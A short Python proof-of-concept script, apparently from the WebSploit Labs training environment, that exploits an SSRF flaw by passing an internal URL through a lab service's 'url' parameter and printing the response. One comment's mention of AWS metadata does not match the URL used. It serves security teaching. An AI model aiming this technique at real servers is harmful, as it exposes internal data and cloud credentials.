'''
Script to exploit the SSRF in the WebSploit Labs Galatic Archives container.
Author: Omar Santos @santosomar
'''

import requests

# The URL of the vulnerable web service.
vulnerable_url = 'http://10.6.6.20:5000'

# The internal URL that the attacker wants to access.
# This is to simulate that this data (secret.txt) should be inaccessible from attacker's network.
internal_url = 'https://internal.secretcorp.org/secret.txt'

# The attacker constructs the exploit URL by appending the internal URL
# as a query parameter to the vulnerable service's URL.
exploit_url = vulnerable_url + '?url=' + internal_url

# The attacker sends a request to the exploit URL.
response = requests.get(exploit_url)

# If the vulnerable server is running inside an AWS EC2 instance, it
# will return the instance metadata.
print(response.text)
